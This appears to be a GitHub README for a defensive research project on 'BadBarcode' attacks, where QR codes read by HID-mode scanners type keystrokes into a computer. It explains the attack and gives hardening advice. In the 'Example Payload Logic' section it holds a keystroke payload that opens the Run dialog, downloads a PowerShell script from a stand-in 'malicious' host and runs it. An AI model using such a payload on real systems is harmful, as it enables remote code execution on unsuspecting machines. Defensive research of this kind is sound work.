# Wkt12 QR Codes To HID Injection


<img width="1536" height="1024" alt="IMG_2094" src="https://github.com/user-attachments/assets/96d6807c-84c8-4a7f-991a-e0bc5dde8047" />

Deep Diving into QR Testing 
# WKT12 — QR HID Keystroke Injection Research
A deep‑dive into how QR codes can be weaponized to deliver HID‑based keystroke payloads through scanners operating in USB HID‑KBW mode. This repository documents the attack surface, exploitation workflow, and defensive hardening strategies.

---

## 🛠 Overview
Modern QR scanners can emulate **Human Interface Devices (HID)**, allowing them to behave exactly like a physical keyboard. When a malicious QR code is scanned, the device rapidly injects keystrokes into the system, executing commands without dropping files or touching the network.

This attack class is known as **BadBarcode**, similar to BadUSB and Rubber Ducky‑style keystroke injection.

---

## ⚙️ Attack Workflow

### 1. HID Emulation
When configured in **USB HID-KBW mode**, the scanner identifies itself as a keyboard.  
No drivers. No warnings. Full trust.

### 2. Keystroke Injection
The QR code’s decoded text is “typed” instantly, including:
- Modifier keys (GUI, CTRL, ALT, SHIFT)
- Hotkey sequences
- Multi‑line scripts
- OS‑specific command chains

### 3. Command Execution
Payloads can trigger:
- `Win + R` → Run dialog  
- PowerShell execution  
- Remote payload retrieval  
- Registry edits  
- Persistence mechanisms  

Because HID input is trusted, these actions bypass antivirus and network monitoring.

---

## 🧨 BadBarcode Vulnerability
The **BadBarcode** attack demonstrates how QR codes can embed complex HID payloads.  
Since the OS cannot distinguish between human typing and scanner typing, payloads execute instantly.

Attackers can encode:
- PowerShell one‑liners  
- Reverse shells  
- Ransomware triggers  
- Data exfiltration  
- Privilege escalation attempts  

All without writing a file.

---

## 📄 Example Payload Logic

---
GUI r
powershell.exe -Command “Invoke-WebRequest http://malicious/payload.ps1 -OutFile payload.ps1”
powershell.exe payload.ps1


When scanned, the device types this sequence at high speed.

---

## 🛡 Defense & Hardening

### Restrict Privileged Hotkeys
Disable or limit dangerous shortcuts:
- Win + R  
- Win + X  
- CTRL + SHIFT + ESC  

Group Policy can enforce these restrictions enterprise‑wide.

### Lock Scanner Configuration
Most scanners require scanning a special configuration barcode to change modes.  
Secure them by:
- Password‑locking firmware  
- Disabling HID-KBW mode  
- Using vendor security profiles  

### Endpoint Controls
Since HID attacks bypass network/file scanning:
- Enforce application whitelisting  
- Restrict PowerShell execution  
- Monitor abnormal keystroke bursts  
- Disable USB HID devices where possible  

---

## 🧪 WKT12 Research Scope
This repository supports:
- HID emulation testing  
- QR payload generation  
- OSINT tracking of HID‑based attacks  
- Enterprise hardening templates  
- Defensive policy frameworks  

---

## 📜 License
This project is for **educational and defensive cybersecurity research** only.




